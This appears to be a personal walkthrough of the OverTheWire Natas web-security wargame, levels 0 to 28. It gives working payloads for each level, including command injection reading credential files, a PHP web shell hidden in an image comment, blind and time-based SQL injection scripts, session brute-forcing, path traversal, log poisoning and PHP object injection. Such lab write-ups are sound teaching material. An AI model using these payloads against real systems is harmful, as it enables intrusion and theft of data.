# Level 0

On the borwser, we type the URL **http://natas0.natas.labs.overthewire.org/** and provide the username **natas0** and password **natas0** as mentioned in the war game description.

![alt text](NatasScreenshots/0.png)

# Level 1

To start with, we check the page source by right-clicking and choosing **view page source**.

![alt text](NatasScreenshots/1.png)

The password is stated clearly as a comment on the line 16.

# Level 2

The problem with this level is that you can't right-click on it to go to the page source. But since I'm using **FireFox**, it allowed me to right-click it without any issue. But when I tried it with **Chrome** or **Edge**, it prompted me with an alert messag saying I can't use right-click. Anyway, the solution is to write right before the **URL** the key word **"view-source:"** .

![alt text](NatasScreenshots/2.png)

The password is commented on line 17.

# Level 3

After checking the page source, we can see on line 15 that it is getting an image named **pixel.png** from a folder calld **files/**. Let's check that folder by typing it in the **URL**

![alt text](NatasScreenshots/3.1.png)

We have infront of us two accessible files. One is that image and the other is a txt file.

![alt text](NatasScreenshots/3.2.png)

After clicking on it, it revealed a list of users and their password. Among them, the user **natas3**.

![alt text](NatasScreenshots/3.3.png)

# Level 4

After checking the page source, there is a comment that says Goofle will not find it. That's a hint !

Google uses cralwers to crawl over links and paths of the web. To prevent it from going certain paths, we write these paths on a file called **robots.txt**. So let's check it.

![alt text](NatasScreenshots/4.1.png)

The disallowed path is **/s3cr3t/**.

![alt text](NatasScreenshots/4.2.png)

Folloing it, we find the **users.txt** file like the previous level.

![alt text](NatasScreenshots/4.3.png)

**users.txt** revealed the credentials for the user **natas4**.

![alt text](NatasScreenshots/4.4.png)

# Level 5

We are not allowed to access the page and it tells that it is expecting access from another webpage. This brings us to the concept of **Referer** (yes, an R is missing) which tells from where we came. Let's assume we are on website A and there is a link to website B. When we click it it gets us to website B with the **Referer** holding the website A as we came from there.

To solve this, let's intercept the request right before clicking the **refresh** link and change our **Referer**.

![alt text](NatasScreenshots/5.1.png)

As you can see, the **Referer** field is set to **"http://natas4.natas.labs.overthewire.org/"**. So let's change it to **"http://natas5.natas.labs.overthewire.org/"** and hit **Forward** button.

![alt text](NatasScreenshots/5.2.png)

# Level 6

We are disallowed. Source page didn't reveal anything useful. So let's look around for anything suspecious.

Checking the **Cookies**, we can spot an interesting one named **loggedin** with a value of **0**.

![alt text](NatasScreenshots/6.1.png)

In many programming languages, 0 reffers to False and any other number reffers to True. So let's try changing that cookie's value to 1 and then refreshing the page.

![alt text](NatasScreenshots/6.2.png)

# Level 7

Here we need a secret phrase. Viewing the page source didn't give us anything useful but following the link provided gave as an extra part in the source code which is a php code. This code can be read only by the server that's why we couldn't see it when checking source page on our own.

That piece of code started with including a specific file from a specific folder. so let's follow it by typing it on the **URL** above.

![alt text](NatasScreenshots/7.1.png)

It gave us a blank page. But viewing its source page gave us the secret phrase.

![alt text](NatasScreenshots/7.2.png)

Typing that secret phrase in the input field will grant us access and reveal the next password.

![alt text](NatasScreenshots/7.3.png)

# Level 8

The hint provided in source page is that the password is listed in **/etc/natas_webpass/natas8**. And when follow links for **Home** or **About**, we can clearly see in the url above that it ends with **index.php?page=** followd by our destination. So let's try to replace the destination by **/etc/natas_webpass/natas8**.

![alt text](NatasScreenshots/8.png)

# Level 9

Following the same process in **level 7**. We find some php code. It gae us the secret in its encrypted form along with the function of the encyrption which is **bin2hex(strrev(base64_encode($secret)))**. So basically, it takes the secret as input and converts it to base64 then reverses the result and finally it converts the final result to hex.

![alt text](NatasScreenshots/9.1.png)

To decrypt it, we can revert the process using **CyberChef** by converting from Hex then reversing and finally converting from Base64.

![alt text](NatasScreenshots/9.2.png)

And voilÃ ! We get the secret that will grant us access to the password.

![alt text](NatasScreenshots/9.3.png)

# Level 10

Here, it takes our input and put it directly in a shell command without sanitization to search for it with **grep** command in a file called **directory.txt**.

![alt text](NatasScreenshots/10.1.png)

We can exploit it by making our input a valid command and seperate it from the rest of the command that it is intented to be added to it with th use of semicolon **" ; "**. For exapmle, typing **" ; whoami ; "** will print us the current user.

![alt text](NatasScreenshots/10.2.png)

So let's get the password by typing **" ; cat /etc/natas_webpass/natas10 ; "**.

![alt text](NatasScreenshots/10.3.png)

# Level 11

Here, it did some sanitazion to the input. It no longer accepts input that contains **;** or **&** or **|**.

![alt text](NatasScreenshots/11.1.png)

We can cleverly exploit the **grep** command to search not only in the **dictionary** file but also in **/etc/natas_webpass/natas11** file.

Fortunatly, **grep** can accepts multiple files to look into after specifying the strings to look for. So what we can do is make our input in this form : **" {s} /etc/natas_webpass/natas11 "** where **{s}** will be replaced with strings to look for. And with that, it will search for the existance of **{s}** in **dictionary.txt** and **/etc/natas_webpass/natas11**.

Following the pattern of passwords, we know for sure that it contains numbers so let's replace **{s}** with numbers from 0 to 9 until we get a result.

We got a result with 1. so the input **" 1 /etc/natas_webpass/natas11 "** will give us the password.

![alt text](NatasScreenshots/11.2.png)

# Level 12

After understanding the php code in the source code, we can see that it does the following process :

- It creates an array that contains **showpassword** with the value of **no** and **bgcolor** with the value of **#ffffff** and store it in variable named **defaultdata**
- It has a function of encryption that encrypts by xoring with a key text character by character. The key text is not stated plainly.
- It has a function that loads data from cookie : It grabs the cookie that holds **data** key, decode it from base64, decrypt it, turns it from string to a decoded json then extract from its keys (which are **showpassword** and **bgcolor**) the corresponding values and outputs them in an array. The decryption is made by encrypting again because xoring twice will get you to the same result.
- It has a function to save data data by feeding an array and doing the whole process of json decoding, encrypting, base64 encoding and setting it to the cookie **data**.
- Finally, it checks if the key **showpassword** of the current encrypted **data** cookie has a value of **yes**, it will show as the password.

So basically we need to change the value of the cookie to what it desires but we need it to be encrypted the way it wants with its unknown key. What we have are two things : the **defaultdata** array which is **array( "showpassword"=>"no", "bgcolor"=>"#ffffff")** and the encrypted base64 encoded version of its json encoded string which is **" HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg "** which can be taken from the value of the cookie **data** and removing the **" %3D "** because it just means **" = "** but url encoded. Anyway, these two are enough for us to find the key because if the first xored with key gave us the second, xoring the first with the second will give us the key !

So let's write a similar php code to do the same encypting but changing the key with json encoded version of the **defaultdata** array and encrypt the value of **data** cookie.

```php
<?php

function xor_encrypt($in) {
    $key = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg"))
?>
```

![alt text](NatasScreenshots/12.1.png)

As you can see, it outputs 4 characters that are repeated multiple times which is expected because initialy it used modulo operation to go through the key letters multiple times. Anyway, the key is these 4 characters.

Now, we change our encryption function with the actual key and encrypt the json encoded version of the desired array (which holds the value **yes** to the key **showpassword**) and of course code it in base64.

![alt text](NatasScreenshots/12.2.png)

Injecting that resulted string in **data** cookie and refreshing the page will give us the password.

![alt text](NatasScreenshots/12.3.png)

# Level 13

Going through the source code, what it does is that it take our uploaded file and change its name with a randomly generated one and then it saves it in **upload/** folder and even provides us its link.

Obviously, we are going to craft a web shell as an input which will allow us to inject commands and get output from teh web's server.

I googled for a simple one line php payload and settled with the following :

```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
```

And it will allow us to inject the command in the url above after "**.php?=cmd**".
So let's craft it in a **.php** file (that I named rev.php) and upload it.

![alt text](NatasScreenshots/13.1.png)

The problem is after uploading it, it changes its extension from **.php** to **.jpg** which will prevents its job.

![alt text](NatasScreenshots/13.2.png)

And that's because it set the name randomly (as we said earlier) from the very beginning and replace our file's name, including its extension, with the generated name. This is where it is done :

![alt text](NatasScreenshots/13.3.png)

So to prevent it from changing our extension, after the page is loaded and before uploading our file, we need to change the **HTML** code and specifically change the extenstion of the generated name in that line from **.jpg** to **.php**.

![alt text](NatasScreenshots/13.4.png)

Let's upload now and follow the link to open our reverse web shell.

Let's verify if the payload is working correctly by adding to the url : **" ?cmd=whoami "**.

![alt text](NatasScreenshots/13.5.png)

Cool ! Now let's inject the command **" cat /etc/natas_webpass/natas13 "** to get the next password. But first, we need to URL-encode it. In our case, all we need to is replace that space with **" %20 "**. If you want to make sure, you can hope quickly to CyberChef and URL-encode that command.

Anyway, here is the result :

![alt text](NatasScreenshots/13.6.png)

# Level 14

Now, it checks if we uploaded a legit image so we can't simply throw a php payload. So let's get ourselves a real image and inject in it the payload !

The image needs to be really tiny with a size under 1Kb to be accepted so let's download a small white pixel. Here is a nice website to do so : https://commons.wikimedia.org/wiki/File:1x1.png

Now how can we inject our payload in that image ? Well, each image has a field named **Comment** that can hold strings without affecting the image itself. So let's comment our payload in that image with **exiftool** command. Then, we need to rename our image to hold **.php** extension rather than **.png** so it can work properly

```console
$ exiftool -Comment='<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>' 1x1.png
$ mv 1x1.png 1x1.php
```

![alt text](NatasScreenshots/14.1.png)

Let's run **exiftool** on our new file to check if it is still interpreted as a legit image.

```console
$ exiftool 1x1.php
```

![alt text](NatasScreenshots/14.2.png)

As you can see, it stated that the file type is PNG and the the file type extension is png. It even printed out its comment which is our payload. So let's give it a try!

But don't forget to change the extension from .jpg to .php in HTML code as we did earlier.

![alt text](NatasScreenshots/14.3.png)

It got uploaded successfully. Let's follow its link and type **" ?cmd=whoami "** to test it.

![alt text](NatasScreenshots/14.4.png)

It outputs the result at the start of the last line. Cool !

Let's give it the real deal : **" ?cmd=cat%20/etc/natas_webpass/natas14 "**

![alt text](NatasScreenshots/14.5.png)

# Level 15

Here, we can do some basic SQL injection. Based on the source code, the input is not sanitized so we can manipulate the SQL querry with whatever input we give it.

If we leave the username empty and type {**" or "1" = "1**} in the password, the querry will be interpreted like this

```sql
SELECT * from users where username="" and password="" or "1" = "1"
```

That **{or "1" = "1"}** part makes the statement true whatever the username and password are. And thus, it will select everything in the table and bypass that if statement (that checks if we selected at leat one row) correctly.

![alt text](NatasScreenshots/15.2.png)

![alt text](NatasScreenshots/15.1.png)

# Level 16

Here, it created a table that contains two columns : **username** and **password**. It asks us for the username as an input and checks if it exists in the table and tells us the result. If we blindly type **natas16**, it will state that it exists which is normal since we are seekings its password.

In this level, we can't get any hardcoded information. All we can get is a yes or no answer depending on the correctness of our input.

Since it is not sanitizing our input, we can just check for certain characters in the username instead of the whole word like checking if the first letter is **"n"**.

To do so, we can write **{" or substring(username, 1, 1) = 'n' -- }** in the input field and normally it will ouputs a positive response. Don't forget to add space after -- (which stand for commenting everything that follows it) otherwise it won't work.

We can do the same process on **password** column by comparing every letter with all the possible matches and collect the ones that gave positive response. This way, we can craft the password. This approach is called **Blind Injection**.

We will be hunting the corresponding password for the username **natas16** already found by the key word **"and"**.

Let's create a python script to auatomate the job.

```python
# Import the requests library for making HTTP requests
import requests
# Import string for accessing ASCII letters and digits
import string

# Character set for the password (a-z, A-Z, 0-9)
charset = string.ascii_letters + string.digits
# Expected length of the password which is 32 if we follow the patterns of previous passwords
password_length = 32
# Initialize empty string to build the password
password = ""

# Create a session to maintain authentication across requests
session = requests.Session()
# Set HTTP Basic Authentication with username and password
session.auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

# Iterate through each count (1 to 32) to build the password substring
for count in range(1, password_length + 1):
    # Flag to track if a matching character is found for the current count
    found = False
    # Test each character in the charset
    for char in charset:
        # Craft the SQL injection payload
        # Format: natas16" and binary substring(password,1,count)="password + char" --
        # - binary ensures case-sensitive comparison
        # - substring(password,1,count) extracts password from 1 to count
        # - Compares with current password + guessed character
        # - # comments out the rest of the query
        payload = f'natas16" and binary substring(password,1,{count})="{password}{char}" # '
        # Create data dictionary for POST request with username parameter as mentioned in source code
        data = {"username": payload}
        # Send POST request with the payload
        response = session.post("http://natas15.natas.labs.overthewire.org/index.php", data=data)

        # Check if the response indicates a successful match
        if "This user exists" in response.text:
            # Add the matching character to the password
            password += char
            # Print the current count, character, and partial password
            print(f"Count {count}: {char} (Current: {password})")
            # Set flag to indicate a match was found
            found = True
            # Exit the character loop to move to the next count
            break
        else:
            # Print the character being tried (for debugging progress)
            print(f"Tried char: {char}")

    # If no character matched, stop the script
    if not found:
        print(f"Failed to find character at count {count}. Stopping.")
        break

# Print the final extracted password
print(f"Final password: {password}")
```

**Side Note:** substring is not enough because it is not case-sensitive so we need to use **binary** keyword before it.

Anyway, running this code will provide us the password.

![alt text](NatasScreenshots/16.png)

# Level 17

Here things got difficult. Besides that the input is well sanitized, it is putting it between ' ' in the command so whatever we input it will get converted as a string. But what we can do is taking advantage of **\$** character as it allows us to write bash commands. For instance, \*\$(whoami)** will be converted by the output of the command which is the user name, **\$(echo hello)** will be replaced by the output of echo command which is **hello**. But even so, there is nothing much we can do as, again, whatever command we write, its output will be interpreted as a string to grep it in the **dictionary.txt\*\* file.

One clever solution is based on that when we feed it a blank text, it would return everything in the **dictionary.txt** file. This can be proven by feeding **$(echo )** in the input field which will be converted by an empty **" "** and will output to us a long list of words.

The idea is following the solution of the previous level to blindly guess the password by using **grep** command to check the existance of certain words (which will be automatically constructed from every possible character). If a feeded word exists, the grep command will be converted by the whole word which will be grepped by the original command in **dictionary.txt** and normally it won't find a match and so ouptuts nothing. If the feeded word doesn't exist, the grepp command will ouputs nothing which will eventually outputs everything from **dictionary.txt**.

To test if it works correctly, let's enumarte the existance of numbers in **/etc/natas_webpass/natas17** by the input **$(cat {n} /etc/natas_webpass/natas17)** and changing {n} with numbers from 0 to 9.

For 0, 1 and 2, it outputed nothing but for 3, it outputed everything. So we know that 0, 1 and 2 exists in the password and 3 does not.

To check the existance of the pattern at the start of the word, we use the symbole **^** as **^abc** will retrun every word that starts with **abc**.

Now, let's build a script to automate the search.

```python
import requests
import string

charset = string.ascii_letters + string.digits
password_length = 32
password = ""

session = requests.Session()
session.auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

for count in range(1, password_length + 1):
	found = False
	for char in charset:
		payload = f'$(grep ^{password}{char} /etc/natas_webpass/natas17)'
		url = "http://natas16.natas.labs.overthewire.org/?needle=" + payload + "&submit=Search" # last time it was a POST request. Here, there is no POST methode in the source code and if you check the url after submitting your input, you'll find it in this format. So here we are dealing with GET methode.
		response = session.get(url)
		if("African" in response.text): #When we input nothing, the first word that pops up is African so let's use it as a checker
			print(f"Tried : {char}")
		else:
			password = password + char
			print(f'found a match at position {count} : {password}')
			found = True
			break
	if(found == False):
		print(f'Stopped: no match at position {count}')
		break
print(f'Final password : {password}')
```

After executing the code and waiting for a while, we get our password.

![alt text](NatasScreenshots/17.png)

# Level 18

This level is similar to level 15. But if you check the source code carefully, you'd notice that the echo command lines are commented which means we get no response wether the typed username exists or no and thus, we can't really tell if our blind guess is correct or not.

What we can do here is rely on timing ! SQL has a built-in function that holds the code for some amount of time called **sleep()**. We can inject an sql querry using this function with this format :

```sql
SELECT * from users where username = "natas18" and binary substring(password, 1, {count})={password}{char} and sleep(5) #
```

and check if our guess is true by checking the response time of the session which depends on the time the querry took:

- if the blind guess is true, the substringing comparasion will be true and it will pass to the sleep function which will take 5 seconds before finishing the querry and thus the response time of the session will exceed 5 seconds.
- if the blind guess is false, the substringing comparasion will be false and since we are working with AND keyword, the querry will exit immediatly without executing the sleep function and thus the response time will be way shorter than 5 seconds.

Let's build the script.

```python
import requests
import string

charset = string.ascii_letters + string.digits
password_length = 32
password = ""

session = requests.Session()
session.auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

for count in range(1, password_length + 1):
   found = False
   for char in charset:
       payload = f'natas18" and binary substring(password,1,{count})="{password}{char}" and sleep(5) # '
       data = {"username": payload}
       response = session.post("http://natas17.natas.labs.overthewire.org/index.php", data=data)

       if response.elapsed.total_seconds() > 4.9:
           password += char
           print(f"Count {count}: {char} (Current: {password})")
           found = True
           break
       else:
           print(f"Tried char: {char}")

   if not found:
       print(f"Failed to find character at count {count}. Stopping.")
       break

print(f"Final password: {password}")
```

![alt text](NatasScreenshots/18.png)

# Level 19
Based on the source code, for the password to be revealed, we need for the value of **"admin"** in **$_SESSION** variable to be 1. The function **isValidAdminLogin()** would normally sets it to 1 if we log in with the username **admin**. But the part responsible for that is commented out so no matter what username we use, **"admin"** will always be set to 0.

**$_SESSION** is a superglobal array that stores data that needs to be persistent across pages. These data are saved on server which will provide ID to the client to keep track of the session's data. That ID is called **PHPSESSID** and we can find it in the cookies.

Normally, there was a time where a legit admin connected to the web and has his own legit session with his own ID. What we can do is guessing his ID and hijacking his session by changing the PHPSESSID cookie.

Based in the source code, it randomizes our ID between 1 and 640 so the admin ID must be in that interval. Let's bruteforce the value of PHPSESSID from 1 to 640 using Burp Suite : 
- Go to proxy and open the browser. Open the web and enter the credentials for **natas18**. 
- Enable interception and enter any random username and password then press forward.

![alt text](NatasScreenshots/19.1.png)

- If you check the Request code on line 14, you'll see the cookie parameter which hold the PHPSESSID with the value of 361. Let's send the request to intruder to bruteforce that value (right-click on the request panel and click send to intruder).

![alt text](NatasScreenshots/19.2.png)

- Go to the Intruder section. Select the value to be changed. Click **"add Â§"**. Set payload type to **numbers**. Set the range from 1 to 640. 

![alt text](NatasScreenshots/19.3.png)

- Go to settings on the right vertical pannel. Scroll down to **Auto-pause attack**. Add the item **"You are an admin."** so it will stop when it finds in without checking for other numbers.

- Hit **Start Attack** and wait for the magic.

![alt text](NatasScreenshots/19.4.png)

- As you can see, it stopped at 119. Let's change the cookie to that value, refresh and see the result.

![alt text](NatasScreenshots/19.5.png)

# Level 20

This time, it says that the ID is no longer sequential. And if we log in with arbitrary credentials (mine were **admin** for username and **test** for password), we see that the ID value a string of 18 character from a-z and 0-9. In my case, it **"3332322d61646d696e"**.

Considering the character set it is using, it gave the vibe of being hex coded. So after decoding it, I found that it is translated from **"322-admin"**. Interesting.

My guess that with the right number in range from 1 to 640 and appending to it **"-admin"**, we will get the admin's session. But in ASCII hex version.

the **"-admin"** part is **2d61646d696e** in hex. And we need to prefix it with numbers from 1 to 640 in hex. Numbers are converted digit by digit and each digit is added 30 to it. So 0 is 30 in hex, 1 is 31, 9 is 39, 10 is 3130, 11 is 3131, 19 is 3139. We can write a python script that converts numbers to hex and add the the **"-admin"** suffix to them.

```python
for nb in range (1, 641):
        result = ""
        st = str(nb)
        for char in st:
                result += "3" + char
        result +=  "2d61646d696e"
        print(result)
```

After writing this code, we can output its result to file to be used as a payload list

```console
$ python3 list.py > payload.txt
```

Now we take this payload list to Burp Suite. After following the steps in the previous level, we choose **simple text** as payload type and load our generated list.

It stopped on attempt 281 with the payload **3238312d61646d696e**

Let's plug it in **SPHPSESSID** cookie and get in!

![alt text](NatasScreenshots/20.3.png)

# Level 21

As previously, we need to have a key named **admin** in the **$_SESSION** variable with a value of 1. But this time, the code is running differently. Let's understand the source code.

After starting the session, the **session_set_save_handler()** will take care of the workflow of the code. First, it will execute the **myopen()**, which is empty, followed by **myread()**. The my **myread()** will open a file named after our session and reads its content line by line and for each line, it splits it per space and takes the first two strings where the first will be the key in the **$_SESSION** and the second will be the value. For exapmle, if the file has :
```
Bob 123
Alice 456
```
The final treatment to the **$_SESSION** will be :

```php
$_SESSION['Bob'] = 123;
$_SESSION['Alice'] = 456;
```

Then, it will execute the rest of code which is basically reading our input and putting it as a value to the key **"name""** in **$Ã¨SESSION** and exectuting the **print_credentials()** function.

Finally, it executes the **mywrite()** functions which will empty the file and fill it from start with the content of **$_SESSION**.

Now let's get to the exploitation part. The code sets **"name"** value in **$_SESSION** without sanitization from our input which will be written in the session file later. What we can do is forcing it to write a new line containing **"admin 1"**. That new line will later be appended as new key-value session.

Let's clarify the process :

- our input will be **"blabla\nadmin 1"**. We put **"\n"** to force it to write a new line.
- **myread()** will be exucted and read the content of the session file which doesn't exist as the first time connecting.
- Then **$_SESSION** will sets the value of **"name"** to our input so it will be :
```php
$_SESSION['name'] = blabla\nadmin 1
```
- The **print_credentials()** will be executed and since there is no **"admin"** key with value 1 yet, nothing special will happen.
- Finally, **mywrite()** will read the what **$_SESSION** holds in a form of key-value pair, add a space between them and **"\n** at the end of each pair and put the result in the session file. So the session file will have :
```
name blabla
admin 1
```

For now, we have no useful output. But if we do another request, the **myread()** function will run differently as now we have a session file with useful content. It will split it line by line, and for each line it will split it by space and take the first part as **$_SESSION** key and the second part as its value. So the **$_SESSION** now will look like this :

```php
$_SESSION['name'] = blabla;
$_SESSION['admin'] = 1;
```

And thus, the **print_credentials()** will output what we want.

The issue we rae left of is injecting the **"\n"** character in our input because the browser will not read it as the special new line character. What we can do is recurring to Burp Suite, intercepting the request and changing the request to what we desire. But don't forget to URL-Encode the input !

![alt text](NatasScreenshots/21.1.png)

So the url encoded version of our input is **"blabla%0Aadmin%201"**.

![alt text](NatasScreenshots/21.2.png)

After connecting to the web, let's enable interception, input whatever we want, proceeding the request, changing the "**name"** variable with our payload and hitting forward.

Now we can turn of the interception and run another request. And voilÃ  !

![alt text](NatasScreenshots/21.3.png)

# Level 22

Okay this level gave me real hard time and I'll explain why by the end of the solution.

So this level gives us a link to another website and it tells us that they are colocated which means they are both hosted on the same server and there is a chance they may share the same **$_SESSION** variable. Let's assume they does.

The first website that can provide us the password use the same technique before : it checks if there is a key in **$_SESSION** named **"admin"** and mapped with the value 1. But we here we have no way to change it.

As for the second website, its job is changing some CSS formatting and it uses **$_SESSION** for that by mapping key-value with tag-value. And it sets the values to the inputs we provide. Later, it check if there is a **Submit** request and if there is, it sets all the requests' keys and values to the **$_SESSION**'s keys and value. So what we can do is injecting an input to make another key-value and it will be processed as a request. We can use **Burp Suite** for efficient work.

Let's connect to the website with **Burp Suite** and enable interception. Click update and in the request scroll down where you'll see all the requests and simply add **"&admin=1"** around the **Submit** request.

![alt text](NatasScreenshots/22.1.png)

Press forward. Now let's take the provided **PHPSESSID** cookie as it reffers to the **$_SESSION** we have just manipulated and let's put it in the first website cookie and hit refresh.

Now let's comeback to the part where it gave me a real pain in my you know what. Theorically, it would work normally and we'll see credentials. But no matter how I debug and try, it gave nothing. After spending the whole evening experimenting, I got to the conclusion that there is a timeout before the **$_SESSION** gets resetted or the link between the two websites expires or I don't know what exactly. But what I know for sure that it is a matter of timing. So changing the level's cookie and refreshing a bit late will revert our attempt. To solve this, you need to be really quick : Get the new cookie from a first attempt, change the cookie of the level and leave it like that, redo the interception and request changing, then quickly come back to the level website and hit refresh.

![alt text](NatasScreenshots/22.2.png)

# Level 23

This level requires a key named **"revelio"** in **$_GET** variable which can be easily injected in the request URL. But it first checks the existance of **"admin"** in **$_SESSION** with the value 1. If there is no such thing, it will redirect us to the root path. Then, the code proceed and shows us the credentials if the **"revelio"** thing exists.

To bypass the redirection, we can use **Burp Suite**. Go to proxy and do the request normally, then send it to repeater where the magic happens. 

In the first line right after the **GET** keyword, add **"?revelio=blabla"** after the backslash to set the required key whatever value you'd like. And just hit send. The repeater will bypass the redirection by default. You can see the response in **pretty format** to see the password or move to **raw format** to copy it from line 30.

![alt text](NatasScreenshots/23.png)

# Level 24

The required password needs to meet these two if statement conditions :

```php
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 ))
```

The **strstr()** extracts from the first parameter the text strating from the first occurance of the second parameter to the end of the first's text. So 
```php
strstr("Hello World!", "Wrold");
```
will output **"World!"**.

To meet that condition, we just need for our password to contain **"iloveyou"** in it.

For the second condition, it compares our password with the number 10. The issue is when it comes to comparing strings with numbers, php normally treats texts as the value 0. But when the text starts with number, it treats it as that number. So we need to start our password with a number strictly greater than 10.

So submittinhg **"11iloveyou** will do the job.

![alt text](NatasScreenshots/24.png)

# Level 25

Here, it checks for password using **strcmp()** function which compares our inputted string with a hidden string that we have no access to. After some research, I found out that older versions of php have vulnerability in their **strcmp()** function. Since it is expecting strings as parameters, passing arrays to it will result unexpected behaviour. So let's try casting **passwd** from a string to an array by adding **"[]"** in the url

![alt text](NatasScreenshots/25.png)

Worked like a charm!

# Level 26

According to the source code, we are limited by the **safeinclude()** function. But there is it using an unusual log filing algorithm and anything unusual is a road to an exploitation. So our key orbits around that file it uses to save logs.

First of all, it names it based on our **PHPSESSID** and storing it in the path **"/var/www/natas/natas25/logs"**. We need a way to get to that file.

The **safeinclude()** function is not that strong because it uses **str_replace()** to guard from file directory traversal and that function does not do recursive checks. For example, if we want an output that has no **"bla"** in it, we would write
```php
str_replace("bla", "", $input);
```
but if the input holds the value **"blblaa123"**, it will be treated like
```php
str_replace("bla", "", "blblaa123");
```
and will process the replacement only once so it will output the string **"bla123"** which is not intended.

Based on this, we can force **"../"** by writing **"....//"**.

The code is accessing **"/language"** folder so the **"logs"** is most likely sits next it so one step back would do the job.

To test it, let's inject in the get request **"?lang=....//logs/natas25_3btpuv1hv6ts4j8emgrv1q4egr.log"**. I used my session id so please replace it with yours which can be found in cookie data.

![alt text](NatasScreenshots/26.1.png)

So we have a way to access that file, Super! But how can we take advantage of this ? Well, checking the **logRequest()** function, the one thing that we have full control over is the **$_SERVER['HTTP_USER_AGENT']**. It reads our **User-Agent** and append it directly to the file without sanitization. We can easily change the value of **User-Agent** with **Burp Suite** and modify it in the request. With this power in our hand, we can change **User-Agent** to a php code that will be executed whenever we open the content of the log file. Let's try by changing the value **User-Agent** in the request with a simple echo command :
```php
<?php echo "********blabla********"; ?>
```
![alt text](NatasScreenshots/26.2.png)

Working perfectly fine!

Now, let's get the password by reading the content of **etc/natas_webpass/natas26** and echoing it :
```php
<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>
```
![alt text](NatasScreenshots/26.3.png)
Amazing!

# Level 27

This level takes two points coordinates and draw a line between them over a black 400x300 image. It uses a cookie called **drawing** to pass coordinates to it and this happens with **serialization** which means converting an array to a string. Since we are dealing with **serialization**, we can think of **PHP Object Injection** attack. Let's explain it.

First, we need to know something about **unserilize()** function (which reverts the serialization and converts string to array): If the thing we are deserializing has the magic methods **__wakeup()** and  **__destruct()**, the first gets called when deserializing the object and then the second gets called. To perform the attack we need a class of an object that has one of these methods with code that can be used in our favor.

Luckily, there is a class called **Logger** with a **__destruct()** method that can write something in some file. It is made in a way to append some hardcoded messages in a file located in **/tmp** and named after our **PHPSESSID**.

As a strat, let's see how we can force the website to execute the **Logger**'s **__destruct()** method because there is no instantiation of that class anywhere in the code. Our way to that is the **drawing** cookie. Let's write a php code to generate the base64 encodation of the serialization of the instantiation of an object of that class. This phrase took an effort to write correctly, if it is correct, haha.

```php
<?php
class Logger {}

$logger = new Logger();
$encoded = base64_encode(serialize($logger));
echo $encoded;
?>
```

Running this code will generate the content we need to replace **drawing** with and will let us force the **unserilize()** function to work with an instance of the **Logger** class. It will generate this string :
```
Tzo2OiJMb2dnZXIiOjA6e30=
```
Let's put it in **drawing** cookie and see what will happen.

![alt text](NatasScreenshots/27.1.png)

Well, new errors got shown up that are related to **fopen()** and **fwrite()** functions which are only used in **Logger** class. So we know for sure that an instance has been created and even got executed.

Now let's hit to the next step where we make use of calling an instance of **Logger**. First, we need to change the file it is changing from **/tmp** to somewhere we can open from web gate. From our last attempt, it revealed the main folder that holds this level's web which is **/var/www/natas/natas26**. Besides, if we right-click the image and open in it a new webpage, we can see above in the url that it is in a folder named **/img**. So let's use **/var/www/natas/natas26/img** as a folder to hold our altered file. Make the file name unique to avoid conflict with other people following this approach. Also, let's inject some html code in the **$initMsg** and **$exitMsg** variables to test it.

```php
<?php
class Logger {
	private $logFile;
    private $initMsg;
    private $exitMsg;
        
	function __construct(){
            $this->initMsg="#<h1>Hello World</h1>";
            $this->exitMsg="<h1>Goodbye World</h1>";
            $this->logFile = "/var/www/natas/natas26/img/njeeh.php";
	}
}

$logger = new Logger();
$encoded = base64_encode(serialize($logger));
echo $encoded;
?>
```

![alt text](NatasScreenshots/27.2.png)

After changing the **drawing** cookie, refreshing and following the url of our created file, we can see that it outputs the exit message. It skipped the init one because as we mentioned the unserialization process calle only **_wakeup()** (which is not present) and **_destruct()**.

Now, let's change the **$exitMsg** to a php payload that will echo the password for the next level

```php
<?php
class Logger {
	private $logFile;
    private $initMsg;
    private $exitMsg;
        
	function __construct(){
            $this->initMsg="#<h1>Hello World</h1>";
            $this->exitMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27')?>";
            $this->logFile = "/var/www/natas/natas26/img/njeeh.php";
	}
}

$logger = new Logger();
$encoded = base64_encode(serialize($logger));
echo $encoded;
?>
```

![alt text](NatasScreenshots/27.3.png)

Perfect!

# Level 28

The logic in this level is simple. We type a username and a password. If the username does not exist, it creates it mapped with the password provided. If it does, it checks if the provided password matches the one saved from its creation. If it does, it welcomes you and give you the credentials for that username. If not, it says wrong password for that user.

If we put **natas28** as username and some random password, it will say that the password is wrong which means the account already exists and it holds the password we're looking for and logging in to it will reveal the password.

![alt text](NatasScreenshots/28.1.png)

The vulnerable side of this logic is that it uses 3 differents querries for each step : Checking user existance, checking user and password correctness and showing user's data.  And for showing data, it only takes the username as parameter without giving attention to password with it.

So if 2 users shares the same username, there will be confusion in data dumping and the first instance will always be outputted no matter which user asked for it. But if we try to register with a username that already exists, it will interpret it as an attempt to login and will give error of password not matching. So how can we force it to create another account with the username **natas28** ?

First, it takes our input as it is, sanitize it and checks its existace in the data base. If does not, it go to the creation phase.
When creating a new user, it checks for spaces on both edges of our input using **trim()** function so we can't simply add spaces before or after our username and hoping to confuse the database. Then, it just takes the first 64 characters so it can fit in the database. Then it proceed to the sanitazation and registration. So if we give it a username that starts with **natas28** and followed by empty characters to form 64 character in total and follow it with ani random string, it will first read it as a new user and when it registers it, it will only take the first 64 character and since it ends with empty characters, it will remove them and leave only the **natas28** part. The empty character we're going to use is the **null character** symbolized by **"%00"** in url encoding.

We can make the 64 character string with a simple python command :

```console
$ python3
>>> print('natas28'+'%00'*(64-len('natas28')))
```

![alt text](NatasScreenshots/28.2.png)

